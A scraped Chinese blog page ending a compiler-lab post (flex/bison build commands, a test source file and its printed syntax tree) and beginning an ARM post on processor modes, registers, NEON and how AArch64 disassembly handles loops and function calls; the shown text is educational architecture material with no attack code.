<p>编译命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flex lexer.l # 生成lexer.yy.c</span><br><span class="line">bison -d -v parser.y # 生成parser.tab.h, parser.tab.c </span><br><span class="line">gcc display.c parser.tab.c lex.yy.c -lfl -o test1</span><br></pre></td></tr></table></figure>
<p>测试文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a,b,c;<span class="comment">//可改错误1：缺少分号</span></span><br><span class="line"><span class="keyword">float</span> m,n;</span><br><span class="line"><span class="keyword">char</span> c1,c2;<span class="comment">//增加char类型</span></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">10</span>];<span class="comment">//增加数组的定义</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fibo</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">/*注释部分自动去掉*/</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">if</span>(a == <span class="number">1</span> || a == <span class="number">2</span>)&#123;</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	<span class="keyword">for</span>(i&lt;<span class="number">15</span>)&#123;<span class="comment">//增加了for语句循环</span></span><br><span class="line">          i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fibo(a<span class="number">-1</span>)+fibo(a<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span><span class="comment">//注释部分自动去掉</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m,n,i;</span><br><span class="line">	<span class="keyword">char</span> c;</span><br><span class="line">	<span class="keyword">float</span> ar[<span class="number">20</span>];</span><br><span class="line">	m=read();</span><br><span class="line">	i=<span class="number">1</span>;</span><br><span class="line">	i++;</span><br><span class="line">	--i;<span class="comment">//加了自增和自减</span></span><br><span class="line">	m+=i+<span class="number">15</span>;<span class="comment">//加了复合赋值运算</span></span><br><span class="line">	<span class="keyword">while</span>(i &lt;= m)&#123;</span><br><span class="line">		n=fibo(i);</span><br><span class="line">		write(n);</span><br><span class="line">		i=i+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终结果：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">➜  exercise-<span class="number">1</span> ./test1 test.c</span><br><span class="line"> 外部变量定义：</span><br><span class="line">     类型：<span class="keyword">int</span></span><br><span class="line">     变量名：</span><br><span class="line">          ID： a</span><br><span class="line">          ID： b</span><br><span class="line">          ID： c</span><br><span class="line"> 外部变量定义：</span><br><span class="line">     类型：<span class="keyword">float</span></span><br><span class="line">     变量名：</span><br><span class="line">          ID： m</span><br><span class="line">          ID： n</span><br><span class="line"> 外部变量定义：</span><br><span class="line">     类型：<span class="keyword">char</span></span><br><span class="line">     变量名：</span><br><span class="line">          ID： c1</span><br><span class="line">          ID： c2</span><br><span class="line"> 数组定义：</span><br><span class="line">     类型：<span class="keyword">char</span></span><br><span class="line">     数组名：a</span><br><span class="line">     数组大小：</span><br><span class="line">          <span class="keyword">INT</span>： <span class="number">10</span></span><br><span class="line"> 函数定义：</span><br><span class="line">     类型：<span class="keyword">int</span></span><br><span class="line">     函数名：fibo</span><br><span class="line">     函数型参：</span><br><span class="line">          类型：<span class="keyword">int</span></span><br><span class="line">          ID： a</span><br><span class="line">     复合语句：</span><br><span class="line">          复合语句的变量定义：</span><br><span class="line">               LOCAL VAR_NAME：</span><br><span class="line">                    类型：<span class="keyword">int</span></span><br><span class="line">                    变量名：</span><br><span class="line">                         ID： i</span><br><span class="line">          复合语句的语句部分：</span><br><span class="line">               条件语句（<span class="keyword">if</span>-<span class="keyword">else</span>）：</span><br><span class="line">               条件：</span><br><span class="line">                    OR</span><br><span class="line">                         ==</span><br><span class="line">                              ID： a</span><br><span class="line">                              <span class="keyword">INT</span>： <span class="number">1</span></span><br><span class="line">                         ==</span><br><span class="line">                              ID： a</span><br><span class="line">                              <span class="keyword">INT</span>： <span class="number">2</span></span><br><span class="line">               <span class="keyword">IF</span>语句：</span><br><span class="line">                    复合语句：</span><br><span class="line">                         复合语句的变量定义：</span><br><span class="line">                         复合语句的语句部分：</span><br><span class="line">                              返回语句：</span><br><span class="line">                                   <span class="keyword">INT</span>： <span class="number">1</span></span><br><span class="line">               循环语句（<span class="keyword">for</span>）：</span><br><span class="line">                    循环条件：</span><br><span class="line">                    &lt;</span><br><span class="line">                         ID： i</span><br><span class="line">                         <span class="keyword">INT</span>： <span class="number">15</span></span><br><span class="line">                    循环体：</span><br><span class="line">                    复合语句：</span><br><span class="line">                         复合语句的变量定义：</span><br><span class="line">                         复合语句的语句部分：</span><br><span class="line">                              表达式语句：</span><br><span class="line">                                   AUTOADD</span><br><span class="line">                                        ID： i</span><br><span class="line">               返回语句：</span><br><span class="line">                    <span class="keyword">PLUS</span></span><br><span class="line">                         函数调用：</span><br><span class="line">                              函数名：fibo</span><br><span class="line">                              第一个实际参数表达式：</span><br><span class="line">                                   <span class="keyword">MINUS</span></span><br><span class="line">                                        ID： a</span><br><span class="line">                                        <span class="keyword">INT</span>： <span class="number">1</span></span><br><span class="line">                         函数调用：</span><br><span class="line">                              函数名：fibo</span><br><span class="line">                              第一个实际参数表达式：</span><br><span class="line">                                   <span class="keyword">MINUS</span></span><br><span class="line">                                        ID： a</span><br><span class="line">                                        <span class="keyword">INT</span>： <span class="number">2</span></span><br><span class="line"> 函数定义：</span><br><span class="line">     类型：<span class="keyword">int</span></span><br><span class="line">     函数名：main</span><br><span class="line">     函数型参：</span><br><span class="line">     复合语句：</span><br><span class="line">          复合语句的变量定义：</span><br><span class="line">               LOCAL VAR_NAME：</span><br><span class="line">                    类型：<span class="keyword">int</span></span><br><span class="line">                    变量名：</span><br><span class="line">                         ID： m</span><br><span class="line">                    变量名：</span><br><span class="line">                         ID： n</span><br><span class="line">                    变量名：</span><br><span class="line">                         ID： i</span><br><span class="line">               LOCAL VAR_NAME：</span><br><span class="line">                    类型：<span class="keyword">char</span></span><br><span class="line">                    变量名：</span><br><span class="line">                         ID： c</span><br><span class="line">               LOCAL VAR_NAME：</span><br><span class="line">               数组定义：</span><br><span class="line">                    类型：<span class="keyword">float</span></span><br><span class="line">                    数组名：ar</span><br><span class="line">                    数组大小：</span><br><span class="line">                         <span class="keyword">INT</span>： <span class="number">20</span></span><br><span class="line">          复合语句的语句部分：</span><br><span class="line">               表达式语句：</span><br><span class="line">                    ASSIGNOP</span><br><span class="line">                         ID： m</span><br><span class="line">                         函数调用：</span><br><span class="line">                              函数名：<span class="keyword">read</span></span><br><span class="line">                              第一个实际参数表达式：</span><br><span class="line">               表达式语句：</span><br><span class="line">                    ASSIGNOP</span><br><span class="line">                         ID： i</span><br><span class="line">                         <span class="keyword">INT</span>： <span class="number">1</span></span><br><span class="line">               表达式语句：</span><br><span class="line">                    AUTOADD</span><br><span class="line">                         ID： i</span><br><span class="line">               表达式语句：</span><br><span class="line">                    AUTOSUB</span><br><span class="line">                         ID： i</span><br><span class="line">               表达式语句：</span><br><span class="line">                    COMADD</span><br><span class="line">                         ID： m</span><br><span class="line">                         <span class="keyword">PLUS</span></span><br><span class="line">                              ID： i</span><br><span class="line">                              <span class="keyword">INT</span>： <span class="number">15</span></span><br><span class="line">               循环语句（<span class="keyword">while</span>）：</span><br><span class="line">                    循环条件：</span><br><span class="line">                    &lt;=</span><br><span class="line">                         ID： i</span><br><span class="line">                         ID： m</span><br><span class="line">                    循环体：</span><br><span class="line">                    复合语句：</span><br><span class="line">                         复合语句的变量定义：</span><br><span class="line">                         复合语句的语句部分：</span><br><span class="line">                              表达式语句：</span><br><span class="line">                                   ASSIGNOP</span><br><span class="line">                                        ID： n</span><br><span class="line">                                        函数调用：</span><br><span class="line">                                             函数名：fibo</span><br><span class="line">                                             第一个实际参数表达式：</span><br><span class="line">                                                  ID： i</span><br><span class="line">                              表达式语句：</span><br><span class="line">                                   函数调用：</span><br><span class="line">                                        函数名：<span class="keyword">write</span></span><br><span class="line">                                        第一个实际参数表达式：</span><br><span class="line">                                             ID： n</span><br><span class="line">                              表达式语句：</span><br><span class="line">                                   ASSIGNOP</span><br><span class="line">                                        ID： i</span><br><span class="line">                                        <span class="keyword">PLUS</span></span><br><span class="line">                                             ID： i</span><br><span class="line">                                             <span class="keyword">INT</span>： <span class="number">1</span></span><br><span class="line">               返回语句：</span><br><span class="line">                    <span class="keyword">INT</span>： <span class="number">1</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/15/ARM%20pwn%20%E8%BF%9B%E9%98%B6%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/15/ARM%20pwn%20%E8%BF%9B%E9%98%B6%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">ARM pwn 进阶知识</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-15 19:33:42" itemprop="dateCreated datePublished" datetime="2023-03-15T19:33:42+08:00">2023-03-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-01 14:14:39" itemprop="dateModified" datetime="2023-05-01T14:14:39+08:00">2023-05-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>之前已经写过一篇关于 ARM 的博客了：<a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/">ARM pwn 环境搭建+基础入门 | Pwn进你的心 (ywhkkx.github.io)</a> </p>
<p>主要简述了以下各方面的知识：（主要是32位）</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#ARM-架构简述">1. ARM 架构简述</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#搭建环境">2. 搭建环境</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#数据类型和寄存器">3. 数据类型和寄存器</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#ARM-amp-THUMB">4. ARM &amp; THUMB</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#ARM-指令集">5. ARM 指令集</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#加载和存储">6. 加载和存储</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#条件执行">7. 条件执行</a></li>
<li><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/08/29/ARM pwn 环境搭建+基础入门/#栈和函数">8. 栈和函数</a></li>
</ul>
<h2 id="ARM-的七种工作模式"><a href="#ARM-的七种工作模式" class="headerlink" title="ARM 的七种工作模式"></a>ARM 的七种工作模式</h2><img src="/2023/03/15/ARM%20pwn%20%E8%BF%9B%E9%98%B6%E7%9F%A5%E8%AF%86/3731ce6cc46fad7a4f55b593903b3e5c-1682921679589.png" class title="3731ce6cc46fad7a4f55b593903b3e5c"> 
<ul>
<li>用户模式（USR）：正常程序执行模式，不能直接切换到其他模式</li>
<li>系统模式（SYS）：运行操作系统的特权任务，与用户模式类似，但具有可以直接切换到其他模式等特权</li>
<li>快中断模式（FIQ）：支持高速数据传输及通道处理，FIQ异常响应时进入此模式</li>
<li>中断模式（IRQ）：用于通用中断处理，IRQ异常响应时进入此模式</li>
<li>管理模式（SVC）：操作系统保护模式，系统复位和软件中断响应时进入此模式（由系统调用执行软中断SWI命令触发）</li>
<li>中止模式（ABT）：用于支持虚拟内存和/或存储器保护，在ARM7TDMI没有大用处</li>
<li>未定义模式（UND）：支持硬件协处理器的软件仿真，未定义指令异常响应时进入此模式</li>
</ul>
<p>在所有的寄存器中，有些是各模式共用同一个物理寄存器，有些寄存器是各个模式自己拥有独立的物理寄存器</p>
<p>CPSR 和 SPSR 都是程序状态寄存器，其中 SPSR 是用来保存中断前的 CPSR 中的值，以便在中断返回之后恢复处理器程序状态</p>
<h2 id="ARM-的-NEON-寄存器"><a href="#ARM-的-NEON-寄存器" class="headerlink" title="ARM 的 NEON 寄存器"></a>ARM 的 NEON 寄存器</h2><p><strong>常规寄存器</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>32位</th>
<th>64位</th>
<th>别名</th>
<th style="text-align:left">目的</th>
</tr>
</thead>
<tbody>
<tr>
<td>R0-R6</td>
<td>X0-X7</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td></td>
<td>X8</td>
<td>–</td>
<td style="text-align:left">保存子程序返回值</td>
</tr>
<tr>
<td>R7</td>
<td></td>
<td>–</td>
<td style="text-align:left">持有系统调用号</td>
</tr>
<tr>
<td></td>
<td>X9-X15</td>
<td>临时寄存器</td>
<td style="text-align:left">子程序使用时不需要保存</td>
</tr>
<tr>
<td>R8-R10</td>
<td>X19-X28</td>
<td>临时寄存器</td>
<td style="text-align:left">子程序使用时必须保存</td>
</tr>
<tr>
<td></td>
<td>X18</td>
<td>–</td>
<td style="text-align:left">记录平台信息</td>
</tr>
<tr>
<td>R11</td>
<td>X29</td>
<td>FP</td>
<td style="text-align:left">帧指针</td>
</tr>
<tr>
<td>R12</td>
<td>X16-X17</td>
<td>IP</td>
<td style="text-align:left">程序内呼叫</td>
</tr>
<tr>
<td>R13</td>
<td>X31</td>
<td>SP</td>
<td style="text-align:left">栈指针</td>
</tr>
<tr>
<td>R14</td>
<td>X30</td>
<td>LR</td>
<td style="text-align:left">链接注册</td>
</tr>
<tr>
<td>R15</td>
<td></td>
<td>PC</td>
<td style="text-align:left">程序计数器</td>
</tr>
<tr>
<td>CPSR</td>
<td>CPSR</td>
<td>–</td>
<td style="text-align:left">当前程序状态寄存器</td>
</tr>
<tr>
<td>SPSR</td>
<td>SPSR</td>
<td>–</td>
<td style="text-align:left">程序状态保存寄存器</td>
</tr>
</tbody>
</table>
</div>
<p><strong>NEON 寄存器</strong></p>
<p>ARM NEON 技术本质上是一种高级的单指令多数据（SIMD）架构扩展，这种扩展仅在一些 ARMv7-A 和 ARMv7-R 架构以及 ARMv8 架构上支持：</p>
<ul>
<li>从 ARMv5 架构开始引入 VFP（vector-floating-point） 指令扩展，可以通过使用短向量指令来加速浮点计算</li>
<li>从 ARMv7 架构开始引入 NEON 技术，NEON 技术同样是依靠向量指令来加速计算，VFP 向量指令加速的模式被弃用，因此 VFP 单元有时也称之为 FPU（Floating Point Unit）单元 </li>
</ul>
<p>NEON 寄存器主要是用来存放包含相同数据类型元素的向量：</p>
<ul>
<li>在 ARMv7 架构中（32位）， 一共有16个128位寄存器，一个128位寄存器又可以分为两个64位寄存器，以此类推</li>
<li>在 ARMv8 架构中（64位），所有寄存器的总数相比 ARMv7 架构翻倍 </li>
<li>Q 寄存器：128位寄存器</li>
<li>D 寄存器：64位寄存器</li>
<li>S 寄存器：32位寄存器</li>
<li>H 寄存器：16位寄存器</li>
<li>B 寄存器：8位寄存器</li>
</ul>
<p>32位下 NEON 寄存器：</p>
<ul>
<li>32个S寄存器，S0~S31（单字，32bit）</li>
<li>32个D寄存器，D0~D31（双字，64bit）</li>
<li>16个Q寄存器，Q0~Q15（四字，128bit）</li>
</ul>
<p>64位下 NEON 寄存器：</p>
<ul>
<li>32个B寄存器，B0~B31（字节，8bit）</li>
<li>32个H寄存器，H0~H31（半字，16bit）</li>
<li>32个S寄存器，S0~S31（单字，32bit）</li>
<li>32个D寄存器，D0~D31（双字，64bit）</li>
<li>32个Q寄存器，V0~V31（四字，128bit）</li>
</ul>
<h2 id="ARM-的函数调用"><a href="#ARM-的函数调用" class="headerlink" title="ARM 的函数调用"></a>ARM 的函数调用</h2><p><strong>测试案例一如下：（64位：循环+选择）</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [xsp+2Ch] [xbp+2Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从 main 函数开始到 for 循环之间的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; __unwind &#123;</span><br><span class="line">STP             X29, X30, [SP,#var_30]!		/* 将X29,X30写入[SP+var_30] */</span><br><span class="line">MOV             X29, SP					   /* 将SP写入X29 */</span><br><span class="line">STR             W0, [SP,#0x30+argc]			/* 将W0写入[SP+0x30+argc] */</span><br><span class="line">STR             X1, [SP,#0x30+argv]</span><br><span class="line">STR             WZR, [SP,#0x30+i]</span><br><span class="line">B               loc_794</span><br></pre></td></tr></table></figure>
<ul>
<li>ARM 的 MOV 只支持在寄存器之间转换数据，从内存到 CPU 之间的移动只能通过 LDR/STR 指令来完成 </li>
<li>STP 相当于两个 STR</li>
<li>W0 就是 X0 的低32位（类似于 RAX 和 EAX 之间的关系）</li>
<li>ARMv8 有两个0寄存器，分别是 WZR 和 XZR（零寄存器内容为 “0”）</li>
<li>B 指令是相对跳转指令，根据当前PC寄存器的值加上偏移来实现跳转</li>
</ul>
<p>从 for 循环到 if 语句的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">loc_794</span><br><span class="line">LDR             W0, [SP,#0x30+i]		/* 读取计数器i */</span><br><span class="line">CMP             W0, #9				   /* 对比计数器i是否到达目标值 */</span><br><span class="line">B.LE            loc_76C				   /* 判断上面cmp结果是否小于等于,跳转标号 */</span><br><span class="line">MOV             W0, #0</span><br><span class="line">LDP             X29, X30, [SP+0x30+var_30],#0x30	/* 将[SP+var_30]写回X29,X30 */</span><br><span class="line">RET</span><br></pre></td></tr></table></figure>
<ul>
<li>X0 通常作为计数器（地位相当于 x86 中的 RAX）</li>
<li>B，B.LE 这两个跳转构成了循环</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loc_76C</span><br><span class="line">LDR             W0, [SP,#0x30+i]</span><br><span class="line">AND             W0, W0, #1				</span><br><span class="line">CMP             W0, #0					/* 执行判断语句 */</span><br><span class="line">B.NE            loc_788					/* 判断上面cmp结果是否不等于,跳转标号 */</span><br><span class="line">ADRL            X0, aA  ; s				/* 装载.puts的参数 */</span><br><span class="line">BL              .puts					/* 转移并连接(调用子程序) */</span><br><span class="line">loc_788</span><br><span class="line">LDR             W0, [SP,#0x30+i]		/* 从栈中获取i */</span><br><span class="line">ADD             W0, W0, #1				/* 更新计数器i */</span><br><span class="line">STR             W0, [SP,#0x30+i]		/* 把i放回栈中 */</span><br></pre></td></tr></table></figure>
<ul>
<li>B.NE 构成了选择</li>
</ul>
<p><strong>测试案例二如下：（64位：函数调用）</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [xsp+24h] [xbp+24h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      A(<span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0x40</span>, <span class="number">0x50</span>, <span class="number">0x60</span>, i + <span class="number">10</span>, i + <span class="number">20</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数 A 调用之前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x5500000814</span> &lt;main+<span class="number">64</span>&gt;     ldr    w7, [sp, #<span class="number">0x2c</span>]</span><br><span class="line">  <span class="number">0x5500000818</span> &lt;main+<span class="number">68</span>&gt;     ldr    w6, [sp, #<span class="number">0x28</span>]</span><br><span class="line">  <span class="number">0x550000081c</span> &lt;main+<span class="number">72</span>&gt;     mov    w5, #<span class="number">0x60</span></span><br><span class="line">  <span class="number">0x5500000820</span> &lt;main+<span class="number">76</span>&gt;     mov    w4, #<span class="number">0x50</span></span><br><span class="line">  <span class="number">0x5500000824</span> &lt;main+<span class="number">80</span>&gt;     mov    w3, #<span class="number">0x40</span></span><br><span class="line">  <span class="number">0x5500000828</span> &lt;main+<span class="number">84</span>&gt;     mov    w2, #<span class="number">0x30</span></span><br><span class="line">  <span class="number">0x550000082c</span> &lt;main+<span class="number">88</span>&gt;     mov    w1, #<span class="number">0x20</span></span><br><span class="line">  <span class="number">0x5500000830</span> &lt;main+<span class="number">92</span>&gt;     mov    w0, #<span class="number">0x10</span></span><br><span class="line">► <span class="number">0x5500000834</span> &lt;main+<span class="number">96</span>&gt;     bl     #A                 &lt;A&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>前6个参数分别放入 X0-X5 中，后续的参数从右往左依次入栈</li>
</ul>
<p>函数 A 结束之前：</p>
